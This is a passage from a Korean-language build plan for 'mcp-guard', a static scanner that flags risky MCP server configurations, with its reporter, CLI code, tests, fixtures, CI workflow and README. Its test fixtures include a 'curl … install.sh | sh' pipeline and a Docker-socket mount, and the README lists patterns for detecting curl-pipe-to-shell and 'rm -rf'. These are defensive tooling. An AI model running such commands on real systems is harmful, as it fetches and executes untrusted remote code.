import type { ScanResult } from '../src/types.js';

const result = (): ScanResult => ({
  schemaVersion: '1',
  target: '/Users/alice/mcp.json',
  summary: { risk: 'high', serversScanned: 2, findings: 2 },
  findings: [
    {
      ruleId: 'MCPG005',
      severity: 'high',
      server: 'fs',
      title: 'Broad filesystem access',
      message: 'Argument grants broad access: /Users/alice.',
      recommendation: 'Restrict to a subdirectory.',
    },
    {
      ruleId: 'MCPG004',
      severity: 'medium',
      server: 'remote',
      title: 'Plain HTTP transport',
      message: 'Server URL uses plain HTTP: http://localhost:3000/sse',
    },
  ],
});

describe('renderText', () => {
  it('includes header lines', () => {
    const out = renderText(result(), { color: false, home: '/Users/alice' });
    expect(out).toContain('Risk: HIGH');
    expect(out).toContain('Servers scanned: 2');
    expect(out).toContain('Findings: 2');
  });

  it('groups findings by server', () => {
    const out = renderText(result(), { color: false, home: '/Users/alice' });
    expect(out).toContain('Server: fs');
    expect(out).toContain('Server: remote');
  });

  it('uses redacted path in messages', () => {
    const out = renderText(result(), { color: false, home: '/Users/alice' });
    expect(out).toContain('~');
    expect(out).not.toContain('/Users/alice');
  });

  it('omits ANSI escape codes when color disabled', () => {
    const out = renderText(result(), { color: false, home: '/Users/alice' });
    expect(out).not.toMatch(/\[/);
  });

  it('emits ANSI escape codes when color enabled', () => {
    const out = renderText(result(), { color: true, home: '/Users/alice' });
    expect(out).toMatch(/\[/);
  });

  it('quiet mode omits finding lines', () => {
    const out = renderText(result(), { color: false, quiet: true, home: '/Users/alice' });
    expect(out).toContain('Risk: HIGH');
    expect(out).not.toContain('MCPG005');
    expect(out).not.toContain('Server: fs');
  });

  it('renders empty findings cleanly', () => {
    const out = renderText(
      {
        schemaVersion: '1',
        target: '/Users/alice/mcp.json',
        summary: { risk: 'info', serversScanned: 1, findings: 0 },
        findings: [],
      },
      { color: false, home: '/Users/alice' }
    );
    expect(out).toContain('Risk: INFO');
    expect(out).toContain('Findings: 0');
  });
});
```

- [ ] **Step 20.2: 테스트 실패 확인**

```
pnpm test reporter.text
```

Expected: FAIL.

- [ ] **Step 20.3: 구현 — `src/reporters/textReporter.ts`**

```ts
import os from 'node:os';
import pc from 'picocolors';
import { redactHome } from '../utils/redact.js';
import type { Finding, ScanResult, Severity } from '../types.js';

export interface TextReporterOptions {
  color?: boolean;
  quiet?: boolean;
  home?: string;
}

function colorize(s: string, severity: Severity, color: boolean): string {
  if (!color) return s;
  switch (severity) {
    case 'critical':
      return pc.bold(pc.red(s));
    case 'high':
      return pc.red(s);
    case 'medium':
      return pc.yellow(s);
    case 'low':
      return pc.blue(s);
    case 'info':
    default:
      return pc.dim(s);
  }
}

function redactFinding(f: Finding, home: string): Finding {
  return {
    ...f,
    message: redactHome(f.message, home),
    recommendation: f.recommendation ? redactHome(f.recommendation, home) : f.recommendation,
  };
}

export function renderText(result: ScanResult, opts: TextReporterOptions = {}): string {
  const color = opts.color ?? false;
  const quiet = opts.quiet ?? false;
  const home = opts.home ?? os.homedir();

  const target = redactHome(result.target, home);
  const lines: string[] = [];
  lines.push(`mcp-guard scan ${target}`);
  lines.push('');
  lines.push(
    `Risk: ${colorize(result.summary.risk.toUpperCase(), result.summary.risk, color)}`
  );
  lines.push(`Servers scanned: ${result.summary.serversScanned}`);
  lines.push(`Findings: ${result.summary.findings}`);

  if (quiet || result.findings.length === 0) {
    lines.push('');
    return lines.join('\n');
  }

  const byServer = new Map<string, Finding[]>();
  for (const f of result.findings) {
    const arr = byServer.get(f.server) ?? [];
    arr.push(redactFinding(f, home));
    byServer.set(f.server, arr);
  }

  for (const [serverName, fs] of byServer) {
    lines.push('');
    lines.push(`Server: ${serverName}`);
    for (const f of fs) {
      const tag = `[${f.severity.toUpperCase()}]`;
      lines.push(`  ${colorize(tag, f.severity, color)} ${f.ruleId} ${f.title}`);
      lines.push(`    ${f.message}`);
      if (f.recommendation) {
        lines.push(`    Recommendation: ${f.recommendation}`);
      }
    }
  }

  lines.push('');
  return lines.join('\n');
}
```

- [ ] **Step 20.4: 테스트 통과 확인**

```
pnpm test reporter.text
```

Expected: 모든 테스트 PASS.

- [ ] **Step 20.5: 커밋**

```
git add src/reporters/textReporter.ts test/reporter.text.test.ts
git commit -m "feat(reporter): add text reporter with severity coloring and quiet mode"
```

---

## Task 21: CLI

**Files:**
- Create: `src/cli.ts`
- Create: `test/fixtures/missing-cmd.json`
- Create: `test/fixtures/placeholder-secret.json`
- Create: `test/fixtures/docker-socket.json`
- Create: `test/fixtures/pipeline-curl.json`
- Create: `test/fixtures/public-https.json`
- Test: `test/cli.test.ts`

- [ ] **Step 21.1: 추가 fixture 생성**

`test/fixtures/missing-cmd.json`:

```json
{
  "mcpServers": {
    "broken": { "transport": "stdio" }
  }
}
```

`test/fixtures/placeholder-secret.json`:

```json
{
  "mcpServers": {
    "x": {
      "command": "node",
      "args": ["./srv.js"],
      "env": {
        "API_KEY": "${API_KEY}"
      }
    }
  }
}
```

`test/fixtures/docker-socket.json`:

```json
{
  "mcpServers": {
    "docker-mcp": {
      "command": "docker",
      "args": ["run", "-v", "/var/run/docker.sock:/var/run/docker.sock", "img"]
    }
  }
}
```

`test/fixtures/pipeline-curl.json`:

```json
{
  "mcpServers": {
    "installer": {
      "command": "bash",
      "args": ["-c", "curl https://example.com/install.sh | sh"]
    }
  }
}
```

`test/fixtures/public-https.json`:

```json
{
  "mcpServers": {
    "remote": { "url": "https://api.example.com/mcp" }
  }
}
```

- [ ] **Step 21.2: 실패하는 테스트 작성 — `test/cli.test.ts`**

```ts
import { describe, it, expect } from 'vitest';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import path from 'node:path';

const exec = promisify(execFile);

const fixture = (n: string) => path.resolve('test/fixtures', n);
const cli = path.resolve('src/cli.ts');
const isWindows = process.platform === 'win32';
const tsxBin = path.resolve(
  'node_modules',
  '.bin',
  isWindows ? 'tsx.cmd' : 'tsx'
);

async function runCli(
  args: string[],
  expectFail = false
): Promise<{ stdout: string; stderr: string; code: number }> {
  try {
    const { stdout, stderr } = await exec(
      tsxBin,
      [cli, ...args],
      {
        env: { ...process.env, NO_COLOR: '1' },
        // Node ≥ 20 requires shell:true to spawn .cmd on Windows safely.
        shell: isWindows,
      }
    );
    return { stdout, stderr, code: 0 };
  } catch (err: any) {
    if (expectFail) return { stdout: err.stdout ?? '', stderr: err.stderr ?? '', code: err.code ?? 1 };
    throw err;
  }
}

describe('cli scan', () => {
  it('safe.json exits 0 with no fail-on', async () => {
    const r = await runCli(['scan', fixture('safe.json')]);
    expect(r.code).toBe(0);
    expect(r.stdout).toContain('Risk:');
  });

  it('risky.json --fail-on high exits 1', async () => {
    const r = await runCli(['scan', fixture('risky.json'), '--fail-on', 'high'], true);
    expect(r.code).toBe(1);
  });

  it('safe.json --fail-on high exits 0', async () => {
    const r = await runCli(['scan', fixture('safe.json'), '--fail-on', 'high']);
    expect(r.code).toBe(0);
  });

  it('--json produces parseable JSON with schemaVersion', async () => {
    const r = await runCli(['scan', fixture('risky.json'), '--json']);
    const parsed = JSON.parse(r.stdout);
    expect(parsed.schemaVersion).toBe('1');
    expect(Array.isArray(parsed.findings)).toBe(true);
  });

  it('secret value never appears in text output', async () => {
    const r = await runCli(['scan', fixture('risky.json')]);
    expect(r.stdout).not.toContain('ghp_should_not_be_printed');
    expect(r.stderr).not.toContain('ghp_should_not_be_printed');
  });

  it('secret value never appears in JSON output', async () => {
    const r = await runCli(['scan', fixture('risky.json'), '--json']);
    expect(r.stdout).not.toContain('ghp_should_not_be_printed');
  });

  it('malformed.json exits 2', async () => {
    const r = await runCli(['scan', fixture('malformed.json')], true);
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/parse|Failed/i);
  });

  it('non-existent file exits 2', async () => {
    const r = await runCli(['scan', fixture('does-not-exist.json')], true);
    expect(r.code).toBe(2);
  });

  it('invalid --fail-on value exits 2', async () => {
    const r = await runCli(['scan', fixture('safe.json'), '--fail-on', 'bogus'], true);
    expect(r.code).toBe(2);
  });

  it('docker-socket.json reports MCPG006', async () => {
    const r = await runCli(['scan', fixture('docker-socket.json'), '--json']);
    const parsed = JSON.parse(r.stdout);
    expect(parsed.findings.map((f: any) => f.ruleId)).toContain('MCPG006');
  });

  it('pipeline-curl.json reports MCPG007', async () => {
    const r = await runCli(['scan', fixture('pipeline-curl.json'), '--json']);
    const parsed = JSON.parse(r.stdout);
    expect(parsed.findings.map((f: any) => f.ruleId)).toContain('MCPG007');
  });

  it('public-https.json reports MCPG008', async () => {
    const r = await runCli(['scan', fixture('public-https.json'), '--json']);
    const parsed = JSON.parse(r.stdout);
    expect(parsed.findings.map((f: any) => f.ruleId)).toContain('MCPG008');
  });

  it('placeholder-secret.json reports MCPG001 medium', async () => {
    const r = await runCli(['scan', fixture('placeholder-secret.json'), '--json']);
    const parsed = JSON.parse(r.stdout);
    const finding = parsed.findings.find((f: any) => f.ruleId === 'MCPG001');
    expect(finding.severity).toBe('medium');
  });

  it('missing-cmd.json reports MCPG009', async () => {
    const r = await runCli(['scan', fixture('missing-cmd.json'), '--json']);
    const parsed = JSON.parse(r.stdout);
    expect(parsed.findings.map((f: any) => f.ruleId)).toContain('MCPG009');
  });

  it('empty.json scans without crash and warns on stderr', async () => {
    const r = await runCli(['scan', fixture('empty.json')]);
    expect(r.code).toBe(0);
    expect(r.stderr).toMatch(/mcpServers/);
  });
});
```

- [ ] **Step 21.3: 테스트 실패 확인**

```
pnpm test cli.test
```

Expected: FAIL — 모듈 없음.

- [ ] **Step 21.4: 구현 — `src/cli.ts`**

```ts
import { Command } from 'commander';
import { scan } from './scanner/scan.js';
import { renderJson } from './reporters/jsonReporter.js';
import { renderText } from './reporters/textReporter.js';
import { meetsThreshold } from './scanner/severity.js';
import { LoadError, type Severity } from './types.js';

const SEVERITIES: Severity[] = ['info', 'low', 'medium', 'high', 'critical'];

function isSeverity(s: string): s is Severity {
  return (SEVERITIES as string[]).includes(s);
}

interface ScanOpts {
  json?: boolean;
  failOn?: string;
  // commander maps --no-color to color === false; default true.
  color?: boolean;
  quiet?: boolean;
}

function colorEnabled(opts: ScanOpts): boolean {
  if (opts.color === false) return false;
  if (process.env['NO_COLOR']) return false;
  return Boolean(process.stdout.isTTY);
}

async function runScan(target: string, opts: ScanOpts): Promise<number> {
  if (opts.failOn !== undefined && !isSeverity(opts.failOn)) {
    process.stderr.write(
      `Invalid --fail-on value: ${opts.failOn}. Allowed: ${SEVERITIES.join(', ')}\n`
    );
    return 2;
  }

  let result;
  try {
    result = await scan(target, {
      onWarn: (m) => process.stderr.write(`warning: ${m}\n`),
    });
  } catch (err) {
    if (err instanceof LoadError) {
      process.stderr.write(`error: ${err.message}\n`);
      return 2;
    }
    throw err;
  }

  if (opts.json) {
    process.stdout.write(renderJson(result) + '\n');
  } else {
    process.stdout.write(
      renderText(result, {
        color: colorEnabled(opts),
        quiet: Boolean(opts.quiet),
      }) + '\n'
    );
  }

  if (opts.failOn) {
    const threshold = opts.failOn as Severity;
    const tripped = result.findings.some((f) => meetsThreshold(f.severity, threshold));
    if (tripped) return 1;
  }
  return 0;
}

async function main(): Promise<void> {
  const program = new Command();
  program
    .name('mcp-guard')
    .description('Security scanner for MCP servers and configurations.')
    .version('0.1.0');

  program
    .command('scan')
    .description('Scan an MCP configuration file for risky patterns')
    .argument('<path>', 'path to mcp configuration file')
    .option('--json', 'output JSON')
    .option(
      '--fail-on <level>',
      `exit 1 when findings reach this severity (one of: ${SEVERITIES.join(', ')})`
    )
    .option('--no-color', 'disable colored output')
    .option('--quiet', 'print only the summary')
    .action(async (target: string, options: ScanOpts) => {
      const code = await runScan(target, options);
      process.exit(code);
    });

  await program.parseAsync(process.argv);
}

main().catch((err) => {
  process.stderr.write(`unexpected error: ${err instanceof Error ? err.message : String(err)}\n`);
  process.exit(2);
});
```

- [ ] **Step 21.5: 테스트 통과 확인**

```
pnpm test cli.test
```

Expected: 모든 테스트 PASS.

- [ ] **Step 21.6: typecheck**

```
pnpm typecheck
```

Expected: 에러 없음.

- [ ] **Step 21.7: 수동 동작 확인**

```
pnpm dev scan test/fixtures/risky.json
```

Expected: text 리포트가 stdout으로 출력되고 MCPG001/002/003/004/005/007 finding이 보임. 토큰 값(`ghp_should_not_be_printed`)은 출력에 없음.

```
pnpm dev scan test/fixtures/risky.json --json
```

Expected: valid JSON, schemaVersion="1".

- [ ] **Step 21.8: 커밋**

```
git add src/cli.ts test/cli.test.ts test/fixtures/missing-cmd.json test/fixtures/placeholder-secret.json test/fixtures/docker-socket.json test/fixtures/pipeline-curl.json test/fixtures/public-https.json
git commit -m "feat(cli): add scan command with JSON/text output, fail-on, color/quiet"
```

---

## Task 22: 빌드 검증

**Files:** none

- [ ] **Step 22.1: 빌드**

```
pnpm build
```

Expected: `dist/cli.js`, `dist/index.js`, `dist/cli.d.ts`, `dist/index.d.ts` 생성. 에러 없음. shebang(`#!/usr/bin/env node`)이 `dist/cli.js` 첫 줄에 있음.

- [ ] **Step 22.2: 빌드 결과로 직접 실행 확인**

```
node dist/cli.js scan test/fixtures/risky.json
```

Expected: text 리포트 정상 출력. (Windows에서는 `node dist\cli.js ...`)

- [ ] **Step 22.3: 전체 테스트 + typecheck 실행**

```
pnpm typecheck
pnpm test
pnpm build
```

Expected: 셋 다 성공.

- [ ] **Step 22.4: 빌드 산출물이 commit 대상이 아님을 확인**

```
git status
```

Expected: `dist/`는 staged/untracked 모두에서 안 보임 (.gitignore에 의해 제외됨).

- [ ] **Step 22.5: 만약 dist가 untracked로 보이면 .gitignore 보정**

`.gitignore`에 단순 `dist/`만 추가했는지 확인. 이미 Nuxt 섹션에 `dist`가 있다면 충분.

(이 step에서 변경이 있었다면 commit:)

```
git add .gitignore
git commit -m "chore: ensure dist/ is gitignored"
```

(없으면 스킵)

---

## Task 23: CI 워크플로

**Files:**
- Create: `.github/workflows/ci.yml`

- [ ] **Step 23.1: 작성 — `.github/workflows/ci.yml`**

```yaml
name: ci

on:
  pull_request:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        node: [20, 22]
    steps:
      - uses: actions/checkout@v4

      - name: Setup pnpm
        uses: pnpm/action-setup@v4
        with:
          version: 9

      - name: Setup Node.js ${{ matrix.node }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
          cache: pnpm

      - name: Install dependencies
        run: pnpm install --frozen-lockfile

      - name: Type check
        run: pnpm typecheck

      - name: Test
        run: pnpm test

      - name: Build
        run: pnpm build
```

- [ ] **Step 23.2: 로컬에서 동일 단계 한 번 실행**

```
pnpm install --frozen-lockfile
pnpm typecheck
pnpm test
pnpm build
```

Expected: 4개 단계 모두 성공.

- [ ] **Step 23.3: 커밋**

```
git add .github/workflows/ci.yml
git commit -m "ci: add GitHub Actions workflow (Node 20+22, pnpm, typecheck/test/build)"
```

---

## Task 24: README

**Files:**
- Modify: `README.md` (전체 교체)

- [ ] **Step 24.1: README 작성**

`README.md`:

```markdown
# mcp-guard

Security scanner for MCP servers and configurations.

mcp-guard helps developers inspect MCP servers and MCP client configuration files before connecting them to AI coding tools, agents, or local development environments.

Part of Nestarc Labs — experimental open-source tools for safer backend and AI-assisted development workflows.

## Why

MCP servers can expose local files, environment variables, shell commands, network endpoints, and external services. mcp-guard performs static checks to highlight potentially risky configuration before use. It is a static scanner — it does not execute the server and does not make network calls.

## Status

v0.1.0 — pre-release. Not yet published to npm.

## Install (after publish)

```bash
npm install -g @nestarc/mcp-guard
```

or run directly:

```bash
npx @nestarc/mcp-guard scan ./mcp.json
```

## Usage

```bash
mcp-guard scan ./mcp.json
mcp-guard scan --json ./mcp.json
mcp-guard scan --fail-on high ./mcp.json
```

### Options

| Option | Description |
|---|---|
| `--json` | Output machine-readable JSON |
| `--fail-on <level>` | Exit with code 1 when findings reach the given level (`info`, `low`, `medium`, `high`, `critical`) |
| `--no-color` | Disable colored terminal output (also respects `NO_COLOR`) |
| `--quiet` | Print only the summary in text mode |

### Exit codes

| Code | Meaning |
|---|---|
| 0 | Scan completed; no finding reached the fail-on threshold |
| 1 | Scan completed; at least one finding reached the fail-on threshold |
| 2 | Invalid input, parse error, missing file, or CLI usage error |

## What it checks

| Rule | Default severity | What it looks for |
|---|---|---|
| MCPG001 | high | Secret-like environment variables (TOKEN/SECRET/PASSWORD/API_KEY/PRIVATE_KEY/CREDENTIALS/AWS_*/GCP_*/AZURE_*…). Values are never printed. |
| MCPG002 | high | Shell interpreters used as command (bash/sh/zsh/cmd/powershell…) |
| MCPG003 | medium | Dynamic package runners (npx/pnpx/bunx/uvx, yarn/pnpm dlx) |
| MCPG004 | medium | Plain HTTP transport |
| MCPG005 | high | Broad filesystem access (`/`, `~`, `/Users`, drive roots, parent traversal) |
| MCPG006 | high | Docker `--privileged` or socket/host root mounts |
| MCPG007 | critical | Suspicious shell pipelines (`curl … \| sh`, `rm -rf`, `chmod +x`) |
| MCPG008 | low | Public HTTPS remote endpoints |
| MCPG009 | info | Server entry missing both `command` and `url` |

## Limitations

mcp-guard is a static scanner. It does not certify an MCP server as safe and does not execute the server during scans. False positives and false negatives are possible. Always review findings in context.

## Development

Requires Node 20+ and pnpm 9 (`corepack enable` if you do not have pnpm).

```bash
pnpm install
pnpm test
pnpm build
pnpm dev scan test/fixtures/risky.json
```

## License

Apache-2.0
```

- [ ] **Step 24.2: 커밋**

```
git add README.md
git commit -m "docs: write user-facing README with usage, rules, and limitations"
```

---

## Task 25: 최종 검증

**Files:** none

- [ ] **Step 25.1: 클린 install / build / test**

```
rm -rf node_modules dist
pnpm install --frozen-lockfile
pnpm typecheck
pnpm test
pnpm build
```

Windows PowerShell:

```
Remove-Item -Recurse -Force node_modules,dist -ErrorAction SilentlyContinue
pnpm install --frozen-lockfile
pnpm typecheck
pnpm test
pnpm build
```

Expected: 4단계 모두 성공.

- [ ] **Step 25.2: 수동 검증 — risky.json 텍스트 출력**

```
pnpm dev scan test/fixtures/risky.json
```

Expected: stdout에 다음을 포함:
- `Risk: CRITICAL` (또는 컬러 적용된 동등 표시)
- `MCPG001`, `MCPG002`, `MCPG003`, `MCPG004`, `MCPG005`, `MCPG007` 등의 ruleId
- `ghp_should_not_be_printed` 문자열 부재

- [ ] **Step 25.3: 수동 검증 — risky.json JSON 출력**

```
pnpm dev scan test/fixtures/risky.json --json
```

Expected: parseable JSON. `schemaVersion: "1"`. `findings[*].ruleId`에 MCPG001/002/003/004/005/007 모두 포함.

- [ ] **Step 25.4: 수동 검증 — fail-on**

```
pnpm dev scan test/fixtures/safe.json --fail-on high
echo $?      # POSIX
```

Windows PowerShell:

```
pnpm dev scan test/fixtures/safe.json --fail-on high
$LASTEXITCODE
```

Expected: 0.

```
pnpm dev scan test/fixtures/risky.json --fail-on high
echo $?      # POSIX  → 1
```

Expected: 1.

- [ ] **Step 25.5: spec §15 Done 기준 모두 충족 여부 확인**

spec §15의 8개 항목을 차례로 점검:

1. install/typecheck/test/build 모두 성공 — Step 25.1에서 확인
2. risky.json이 §6 트리거 룰을 보고 — Step 25.2에서 확인
3. JSON에 schemaVersion="1" — Step 25.3에서 확인
4. safe.json --fail-on high → exit 0 — Step 25.4에서 확인
5. risky.json --fail-on high → exit 1 — Step 25.4에서 확인
6. 시크릿 값 출력 부재 — Step 25.2/25.3에서 확인 + 자동 테스트가 검증
7. README가 실제 명령/예시 반영 — Task 24에서 작성
8. CI green — push 후 GitHub Actions에서 확인 (사이클 종료 시 PR로)

- [ ] **Step 25.6: 최종 git status**

```
git status
git log --oneline
```

Expected: 클린 working tree. 25개 task에 해당하는 commit 히스토리.

- [ ] **Step 25.7: 사이클 종료 보고**

PR 생성은 사용자 확인 후 별도 진행 (auto mode 제약 외 단계). spec §15의 모든 항목을 충족하면 mcp-guard MVP v0.1.0 사이클 완료.

---

## 참고

- spec: [docs/superpowers/specs/2026-05-10-mcp-guard-mvp-design.md](../specs/2026-05-10-mcp-guard-mvp-design.md)
- handover: `docs/handover.md` (gitignored)
